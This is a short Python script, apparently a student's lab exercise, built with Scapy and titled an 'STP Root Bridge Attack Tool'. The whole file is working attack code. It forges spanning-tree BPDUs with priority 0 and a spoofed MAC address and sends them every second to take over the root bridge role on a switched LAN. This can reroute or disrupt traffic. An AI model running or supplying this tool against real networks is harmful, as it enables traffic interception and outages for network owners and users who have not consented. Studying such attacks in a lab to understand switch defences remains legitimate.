#!/usr/bin/env python3
# D31B1 - STP Root Bridge Attack Tool
# Student: Junior (2024-2015)

from scapy.all import *
import time
import sys

# --- CONFIG ---
TARGET_IFACE = "eth0"  # Cambiar si usas otra interfaz
STP_DST_MAC = "01:80:c2:00:00:00"
MY_MAC = "00:00:00:00:00:01"  # MAC Spoofed (Fake Root)

def stp_attack():
    print(f"\n[*] STARTING STP ROOT BRIDGE ATTACK ON {TARGET_IFACE}")
    print(f"[*] Spoofing MAC: {MY_MAC} | Priority: 0 (Highest)")
    print("[*] Press CTRL+C to stop.\n")

    # Construct Malicious BPDU (Bridge Protocol Data Unit)
    # Priority 0 + MAC = Superior Root Bridge
    eth = Ether(src=MY_MAC, dst=STP_DST_MAC)
    llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
    stp = STP(bpdutype=0x00, bpduflags=0x00, portid=0x8002, 
              rootid=0, rootmac=MY_MAC, 
              bridgeid=0, bridgemac=MY_MAC, 
              pathcost=0)

    packet = eth / llc / stp

    try:
        while True:
            sendp(packet, iface=TARGET_IFACE, verbose=0)
            print(f"\r[+] Sending Superior BPDU... Claiming Root! ({time.strftime('%H:%M:%S')})", end="")
            time.sleep(1) 
            
    except KeyboardInterrupt:
        print("\n\n[*] Attack stopped.")
    except OSError as e:
        print(f"\n[!] Error: {e}")
        print(f"[!] Check interface '{TARGET_IFACE}' and run as root.")

if __name__ == "__main__":
    stp_attack()
